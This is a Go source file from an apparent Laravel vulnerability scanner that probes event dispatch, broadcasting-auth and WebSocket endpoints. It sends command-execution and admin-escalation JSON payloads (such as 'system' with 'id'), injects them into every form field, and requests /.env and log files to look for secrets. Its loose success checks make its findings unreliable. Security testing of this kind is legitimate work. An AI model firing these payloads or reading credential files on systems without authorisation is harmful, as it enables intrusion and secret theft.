package vulnerabilities

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"laravelmap/internal/common"
	"laravelmap/pkg/httpclient"
	"net/url"
	"regexp"
	"strings"
	"time"
)

// EventSystemScanner is a struct that contains an HTTP client for detecting Laravel event system vulnerabilities
type EventSystemScanner struct {
	client *httpclient.Client
}

// NewEventSystemScanner initializes and returns a new EventSystemScanner instance
func NewEventSystemScanner() *EventSystemScanner {
	return &EventSystemScanner{
		client: httpclient.NewClient(15 * time.Second),
	}
}

// Run checks for Laravel event system vulnerabilities
func (ess *EventSystemScanner) Run(target string) []common.ScanResult {
	var results []common.ScanResult

	// Check for event listener vulnerabilities
	listenerResults := ess.checkEventListenerVulnerabilities(target)
	results = append(results, listenerResults...)

	// Check for event broadcasting vulnerabilities
	broadcastingResults := ess.checkEventBroadcastingVulnerabilities(target)
	results = append(results, broadcastingResults...)

	// Check for event configuration exposure
	configResults := ess.checkEventConfigExposure(target)
	results = append(results, configResults...)

	// Check for event injection vulnerabilities
	injectionResults := ess.checkEventInjectionVulnerabilities(target)
	results = append(results, injectionResults...)

	// If no vulnerabilities were detected
	if len(results) == 0 {
		results = append(results, common.ScanResult{
			ScanName:    ess.Name(),
			Category:    "Vulnerabilities",
			Description: "No Laravel event system vulnerabilities detected",
			Path:        target,
			StatusCode:  0,
			Detail:      "No potential Laravel event system vulnerabilities were detected. However, this does not guarantee that the application is not vulnerable to event-related attacks.",
		})
	}

	return results
}

// checkEventListenerVulnerabilities checks for event listener vulnerabilities
func (ess *EventSystemScanner) checkEventListenerVulnerabilities(target string) []common.ScanResult {
	var results []common.ScanResult

	// Find potential event dispatch endpoints
	eventEndpoints := ess.findEventEndpoints(target)

	// Prepare event listener payloads
	listenerPayloads := []struct {
		name  string
		value string
	}{
		{
			name:  "Command Execution Listener",
			value: `{"event":"Illuminate\\Events\\CallQueuedListener","data":{"class":"Illuminate\\Support\\Facades\\Artisan","method":"call","data":["env"]}}`,
		},
		{
			name:  "System Command Listener",
			value: `{"event":"Illuminate\\Events\\CallQueuedListener","data":{"class":"Illuminate\\Support\\Facades\\App","method":"system","data":["id"]}}`,
		},
		{
			name:  "Malicious Event Data",
			value: `{"event":"App\\Events\\UserRegistered","data":{"email":"attacker@example.com","admin":true,"role":"admin"}}`,
		},
		{
			name:  "Event Listener Chain",
			value: `{"event":"Illuminate\\Auth\\Events\\Login","data":{"user":{"id":1,"email":"admin@example.com"}}}`,
		},
	}

	// Test each endpoint with event listener payloads
	for _, endpoint := range eventEndpoints {
		for _, payload := range listenerPayloads {
			// Create the full URL
			fullURL := endpoint
			if !strings.HasPrefix(endpoint, "http") {
				parsedURL, parseErr := url.Parse(target)
				if parseErr != nil {
					continue
				}

				parsedURL.Path = endpoint
				fullURL = parsedURL.String()
			}

			// Send POST request with JSON payload
			headers := map[string]string{
				"Content-Type": "application/json",
				"Accept":       "application/json",
			}
			resp, err := ess.client.Post(fullURL, headers, strings.NewReader(payload.value))
			if err != nil {
				continue
			}

			bodyBytes, err := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}
			bodyString := string(bodyBytes)

			// Check if the response indicates a successful exploitation
			if ess.checkResponseForExploitation(bodyString) {
				results = append(results, common.ScanResult{
					ScanName:    ess.Name(),
					Category:    "Vulnerabilities",
					Description: fmt.Sprintf("Potential Laravel event listener vulnerability (%s)", payload.name),
					Path:        fullURL,
					StatusCode:  resp.StatusCode,
					Detail:      fmt.Sprintf("The endpoint %s might be vulnerable to Laravel event listener exploitation. The application accepted a potentially malicious event payload that could trigger unsafe listeners.", fullURL),
				})

				// Break the loop for this endpoint to avoid duplicate results
				break
			}
		}
	}

	return results
}

// checkEventBroadcastingVulnerabilities checks for event broadcasting vulnerabilities
func (ess *EventSystemScanner) checkEventBroadcastingVulnerabilities(target string) []common.ScanResult {
	var results []common.ScanResult

	// Common broadcasting endpoints
	broadcastingEndpoints := []string{
		"/broadcasting/auth",
		"/broadcast/auth",
		"/socket.io",
		"/laravel-websockets",
		"/api/broadcasting/auth",
		"/api/broadcast/auth",
	}

	// Test each broadcasting endpoint
	for _, endpoint := range broadcastingEndpoints {
		// Create the full URL
		parsedURL, parseErr := url.Parse(target)
		if parseErr != nil {
			continue
		}

		parsedURL.Path = endpoint
		fullURL := parsedURL.String()

		// Test for channel authorization bypass
		authBypassResults := ess.checkChannelAuthorizationBypass(fullURL)
		results = append(results, authBypassResults...)

		// Test for WebSocket security issues
		websocketResults := ess.checkWebSocketSecurity(fullURL)
		results = append(results, websocketResults...)
	}

	return results
}

// checkChannelAuthorizationBypass checks for channel authorization bypass vulnerabilities
func (ess *EventSystemScanner) checkChannelAuthorizationBypass(broadcastURL string) []common.ScanResult {
	var results []common.ScanResult

	// Prepare channel authorization payloads
	channelPayloads := []struct {
		name     string
		channel  string
		socketId string
	}{
		{
			name:     "Private Channel Without Auth",
			channel:  "private-admin",
			socketId: "42.1234",
		},
		{
			name:     "Presence Channel Without Auth",
			channel:  "presence-admin",
			socketId: "42.5678",
		},
		{
			name:     "Private User Channel",
			channel:  "private-user.1",
			socketId: "42.9012",
		},
		{
			name:     "Presence User Channel",
			channel:  "presence-user.1",
			socketId: "42.3456",
		},
	}

	// Test each payload
	for _, payload := range channelPayloads {
		// Create form data
		formData := url.Values{}
		formData.Set("channel_name", payload.channel)
		formData.Set("socket_id", payload.socketId)

		// Send POST request
		headers := map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
		}
		resp, err := ess.client.Post(broadcastURL, headers, strings.NewReader(formData.Encode()))
		if err != nil {
			continue
		}

		bodyBytes, err := ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}
		bodyString := string(bodyBytes)

		// Check if the response indicates a successful authorization
		if ess.checkBroadcastAuthSuccess(bodyString) {
			results = append(results, common.ScanResult{
				ScanName:    ess.Name(),
				Category:    "Vulnerabilities",
				Description: fmt.Sprintf("Potential Laravel broadcasting channel authorization bypass (%s)", payload.name),
				Path:        broadcastURL,
				StatusCode:  resp.StatusCode,
				Detail:      fmt.Sprintf("The broadcasting endpoint %s might be vulnerable to channel authorization bypass. The application authorized access to the channel '%s' without proper authentication.", broadcastURL, payload.channel),
			})

			// Break the loop to avoid duplicate results
			break
		}
	}

	return results
}

// checkBroadcastAuthSuccess checks if the response indicates a successful broadcasting authorization
func (ess *EventSystemScanner) checkBroadcastAuthSuccess(response string) bool {
	// Check for common success indicators
	successPatterns := []string{
		"auth",
		"channel_data",
		"signature",
		"\"auth\":",
		"\"channel_data\":",
	}

	for _, pattern := range successPatterns {
		if strings.Contains(response, pattern) {
			return true
		}
	}

	// Check if the response is a JSON object with auth data
	var jsonResponse map[string]interface{}
	if err := json.Unmarshal([]byte(response), &jsonResponse); err == nil {
		// Check for auth field
		if _, ok := jsonResponse["auth"]; ok {
			return true
		}

		// Check for channel_data field
		if _, ok := jsonResponse["channel_data"]; ok {
			return true
		}
	}

	return false
}

// checkWebSocketSecurity checks for WebSocket security issues
func (ess *EventSystemScanner) checkWebSocketSecurity(websocketURL string) []common.ScanResult {
	var results []common.ScanResult

	// Send a GET request to check WebSocket info
	resp, err := ess.client.Get(websocketURL, nil)
	if err != nil {
		return results
	}

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		return results
	}
	bodyString := string(bodyBytes)

	// Check if the response contains WebSocket information
	if ess.containsWebSocketInfo(bodyString) {
		results = append(results, common.ScanResult{
			ScanName:    ess.Name(),
			Category:    "Vulnerabilities",
			Description: "Laravel WebSocket information exposure",
			Path:        websocketURL,
			StatusCode:  resp.StatusCode,
			Detail:      fmt.Sprintf("The application exposes WebSocket information at %s. This could reveal sensitive information about the WebSocket configuration and potentially allow unauthorized access to WebSocket channels.", websocketURL),
		})
	}

	// Check for CORS misconfiguration
	corsHeaders := resp.Header.Get("Access-Control-Allow-Origin")
	if corsHeaders == "*" {
		results = append(results, common.ScanResult{
			ScanName:    ess.Name(),
			Category:    "Vulnerabilities",
			Description: "Laravel WebSocket CORS misconfiguration",
			Path:        websocketURL,
			StatusCode:  resp.StatusCode,
			Detail:      fmt.Sprintf("The WebSocket endpoint %s has a CORS misconfiguration (Access-Control-Allow-Origin: *). This could allow unauthorized websites to connect to the WebSocket server and potentially access sensitive information.", websocketURL),
		})
	}

	return results
}

// containsWebSocketInfo checks if the response contains WebSocket information
func (ess *EventSystemScanner) containsWebSocketInfo(response string) bool {
	websocketInfoPatterns := []string{
		"websocket",
		"socket.io",
		"laravel-websockets",
		"pusher",
		"echo",
		"broadcasting",
		"ws://",
		"wss://",
		"socket_id",
		"channel_name",
		"\"transport\":",
		"\"sid\":",
		"\"upgrades\":",
		"\"pingInterval\":",
		"\"pingTimeout\":",
	}

	for _, pattern := range websocketInfoPatterns {
		if strings.Contains(strings.ToLower(response), strings.ToLower(pattern)) {
			return true
		}
	}

	return false
}

// checkEventConfigExposure checks for event configuration exposure
func (ess *EventSystemScanner) checkEventConfigExposure(target string) []common.ScanResult {
	var results []common.ScanResult

	// Common paths that might expose event configuration
	configPaths := []string{
		"/config/broadcasting.php",
		"/app/config/broadcasting.php",
		"/storage/logs/laravel.log",
		"/storage/logs/websockets.log",
		"/.env",
	}

	for _, path := range configPaths {
		// Create the full URL
		parsedURL, parseErr := url.Parse(target)
		if parseErr != nil {
			continue
		}

		parsedURL.Path = path
		fullURL := parsedURL.String()

		// Send GET request
		resp, err := ess.client.Get(fullURL, nil)
		if err != nil {
			continue
		}

		bodyBytes, err := ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}
		bodyString := string(bodyBytes)

		// Check if the response contains event configuration information
		if resp.StatusCode == 200 && ess.containsEventConfig(bodyString) {
			results = append(results, common.ScanResult{
				ScanName:    ess.Name(),
				Category:    "Vulnerabilities",
				Description: "Laravel event configuration exposure",
				Path:        fullURL,
				StatusCode:  resp.StatusCode,
				Detail:      fmt.Sprintf("The application exposes event configuration at %s. This could reveal sensitive information such as broadcasting connection details, credentials, and event configuration.", fullURL),
			})
		}
	}

	return results
}

// containsEventConfig checks if the response contains event configuration information
func (ess *EventSystemScanner) containsEventConfig(response string) bool {
	eventConfigPatterns := []string{
		"PUSHER_APP_ID",
		"PUSHER_APP_KEY",
		"PUSHER_APP_SECRET",
		"PUSHER_APP_CLUSTER",
		"BROADCAST_DRIVER",
		"REDIS_HOST",
		"REDIS_PASSWORD",
		"REDIS_PORT",
		"connection => pusher",
		"connection => redis",
		"connection => log",
		"driver => pusher",
		"driver => redis",
		"driver => log",
		"'driver' => 'pusher'",
		"'driver' => 'redis'",
		"'driver' => 'log'",
		"key =>",
		"secret =>",
		"app_id =>",
		"options =>",
		"cluster =>",
		"encrypted =>",
	}

	for _, pattern := range eventConfigPatterns {
		if strings.Contains(response, pattern) {
			return true
		}
	}

	return false
}

// checkEventInjectionVulnerabilities checks for event injection vulnerabilities
func (ess *EventSystemScanner) checkEventInjectionVulnerabilities(target string) []common.ScanResult {
	var results []common.ScanResult

	// Find forms and input fields
	forms := ess.findForms(target)

	// Test each form for event injection
	for _, form := range forms {
		// Only test POST forms
		if form.method != "POST" {
			continue
		}

		// Prepare event injection payloads
		injectionPayloads := []struct {
			name  string
			value string
		}{
			{
				name:  "Event Object Injection",
				value: `{"__class__":"Illuminate\\Events\\Dispatcher","__method__":"dispatch","__args__":["system","id"]}`,
			},
			{
				name:  "Event Name Injection",
				value: `Illuminate\\Auth\\Events\\Login`,
			},
			{
				name:  "Event Data Injection",
				value: `{"user":{"id":1,"email":"admin@example.com","admin":true}}`,
			},
		}

		// Test each payload
		for _, payload := range injectionPayloads {
			// Create a copy of params with the payload
			paramsWithPayload := make(map[string]string)
			for name := range form.params {
				paramsWithPayload[name] = payload.value
			}

			// Create form data
			formData := url.Values{}
			for name, value := range paramsWithPayload {
				formData.Set(name, value)
			}

			// Send POST request
			headers := map[string]string{
				"Content-Type": "application/x-www-form-urlencoded",
			}
			resp, err := ess.client.Post(form.action, headers, strings.NewReader(formData.Encode()))
			if err != nil {
				continue
			}

			bodyBytes, err := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}
			bodyString := string(bodyBytes)

			// Check if the response indicates a successful exploitation
			if ess.checkResponseForExploitation(bodyString) {
				results = append(results, common.ScanResult{
					ScanName:    ess.Name(),
					Category:    "Vulnerabilities",
					Description: fmt.Sprintf("Potential Laravel event injection vulnerability (%s)", payload.name),
					Path:        form.action,
					StatusCode:  resp.StatusCode,
					Detail:      fmt.Sprintf("The form at %s might be vulnerable to Laravel event injection. The application accepted a potentially malicious event payload that could trigger unsafe event handling.", form.action),
				})

				// Break the loop for this form to avoid duplicate results
				break
			}
		}
	}

	return results
}

// findForms finds forms in the target application
func (ess *EventSystemScanner) findForms(target string) []form {
	var forms []form

	// Send a GET request to the target
	resp, err := ess.client.Get(target, nil)
	if err != nil {
		return forms
	}
	defer resp.Body.Close()

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return forms
	}
	bodyString := string(bodyBytes)

	// Find all forms
	formPattern := `<form[^>]*action="([^"]*)"[^>]*method="([^"]*)"[^>]*>(.*?)</form>`
	formRegex := regexp.MustCompile(formPattern)
	formMatches := formRegex.FindAllStringSubmatch(bodyString, -1)

	for _, formMatch := range formMatches {
		if len(formMatch) < 4 {
			continue
		}

		action := formMatch[1]
		method := strings.ToUpper(formMatch[2])
		formContent := formMatch[3]

		// If action is relative, make it absolute
		if !strings.HasPrefix(action, "http") {
			parsedURL, parseErr := url.Parse(target)
			if parseErr != nil {
				continue
			}

			if strings.HasPrefix(action, "/") {
				// Absolute path
				parsedURL.Path = action
			} else {
				// Relative path
				if !strings.HasSuffix(parsedURL.Path, "/") {
					parsedURL.Path += "/"
				}
				parsedURL.Path += action
			}

			action = parsedURL.String()
		}

		// Find all input fields
		params := make(map[string]string)
		inputPattern := `<input[^>]*name="([^"]*)"[^>]*>`
		inputRegex := regexp.MustCompile(inputPattern)
		inputMatches := inputRegex.FindAllStringSubmatch(formContent, -1)

		for _, inputMatch := range inputMatches {
			if len(inputMatch) < 2 {
				continue
			}

			name := inputMatch[1]
			params[name] = ""
		}

		// Find all textarea fields
		textareaPattern := `<textarea[^>]*name="([^"]*)"[^>]*>`
		textareaRegex := regexp.MustCompile(textareaPattern)
		textareaMatches := textareaRegex.FindAllStringSubmatch(formContent, -1)

		for _, textareaMatch := range textareaMatches {
			if len(textareaMatch) < 2 {
				continue
			}

			name := textareaMatch[1]
			params[name] = ""
		}

		forms = append(forms, form{
			action: action,
			method: method,
			params: params,
		})
	}

	return forms
}

// findEventEndpoints finds potential event endpoints in the target application
func (ess *EventSystemScanner) findEventEndpoints(target string) []string {
	var endpoints []string

	// Common event endpoints
	commonEndpoints := []string{
		"/events/dispatch",
		"/event/dispatch",
		"/api/events/dispatch",
		"/api/event/dispatch",
		"/broadcast/auth",
		"/broadcasting/auth",
		"/api/broadcast/auth",
		"/api/broadcasting/auth",
	}

	// Add common endpoints
	endpoints = append(endpoints, commonEndpoints...)

	// Send a GET request to the target
	resp, err := ess.client.Get(target, nil)
	if err != nil {
		return endpoints
	}
	defer resp.Body.Close()

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return endpoints
	}
	bodyString := string(bodyBytes)

	// Extract potential event endpoints from JavaScript files
	jsPattern := `<script[^>]*src="([^"]*\.js)"[^>]*>`
	jsRegex := regexp.MustCompile(jsPattern)
	jsMatches := jsRegex.FindAllStringSubmatch(bodyString, -1)

	for _, jsMatch := range jsMatches {
		if len(jsMatch) < 2 {
			continue
		}

		jsURL := jsMatch[1]
		if !strings.HasPrefix(jsURL, "http") {
			// Convert relative URL to absolute
			parsedURL, parseErr := url.Parse(target)
			if parseErr != nil {
				continue
			}

			if strings.HasPrefix(jsURL, "/") {
				// Absolute path
				parsedURL.Path = jsURL
			} else {
				// Relative path
				if !strings.HasSuffix(parsedURL.Path, "/") {
					parsedURL.Path += "/"
				}
				parsedURL.Path += jsURL
			}

			jsURL = parsedURL.String()
		}

		// Get the JavaScript file
		jsResp, jsErr := ess.client.Get(jsURL, nil)
		if jsErr != nil {
			continue
		}

		jsBodyBytes, jsErr := ioutil.ReadAll(jsResp.Body)
		jsResp.Body.Close()
		if jsErr != nil {
			continue
		}
		jsBodyString := string(jsBodyBytes)

		// Extract potential event endpoints from JavaScript
		eventPatterns := []string{
			`event\.dispatch\(['"]([^'"]+)['"]`,
			`events\.dispatch\(['"]([^'"]+)['"]`,
			`broadcast\(['"]([^'"]+)['"]`,
			`Echo\.channel\(['"]([^'"]+)['"]`,
			`Echo\.private\(['"]([^'"]+)['"]`,
			`Echo\.presence\(['"]([^'"]+)['"]`,
			`url:\s*['"]([^'"]*(?:event|broadcast)[^'"]*)['"]\s*`,
		}

		for _, pattern := range eventPatterns {
			eventRegex := regexp.MustCompile(pattern)
			eventMatches := eventRegex.FindAllStringSubmatch(jsBodyString, -1)

			for _, eventMatch := range eventMatches {
				if len(eventMatch) < 2 {
					continue
				}

				endpoint := eventMatch[1]
				if !strings.HasPrefix(endpoint, "http") && !strings.HasPrefix(endpoint, "/") {
					endpoint = "/" + endpoint
				}

				endpoints = append(endpoints, endpoint)
			}
		}
	}

	return endpoints
}

// checkResponseForExploitation checks if the response indicates a successful exploitation
func (ess *EventSystemScanner) checkResponseForExploitation(response string) bool {
	// Check for common success indicators
	successPatterns := []string{
		"event has been dispatched",
		"event has been broadcast",
		"event has been fired",
		"successfully dispatched",
		"successfully broadcast",
		"successfully fired",
		"event_id",
		"channel_name",
		"event has been",
		"\"success\"",
		"\"status\":\"success\"",
		"\"status\":\"ok\"",
	}

	for _, pattern := range successPatterns {
		if strings.Contains(strings.ToLower(response), strings.ToLower(pattern)) {
			return true
		}
	}

	// Check if the response is a JSON object with success indicators
	var jsonResponse map[string]interface{}
	if err := json.Unmarshal([]byte(response), &jsonResponse); err == nil {
		// Check for success status
		if status, ok := jsonResponse["status"]; ok {
			if statusStr, ok := status.(string); ok {
				if statusStr == "success" || statusStr == "ok" {
					return true
				}
			}
		}

		// Check for event ID
		if _, ok := jsonResponse["event_id"]; ok {
			return true
		}

		// Check for channel name
		if _, ok := jsonResponse["channel_name"]; ok {
			return true
		}
	}

	return false
}

// Name returns the name of the scanner
func (ess *EventSystemScanner) Name() string {
	return "Laravel Event System Scanner"
}
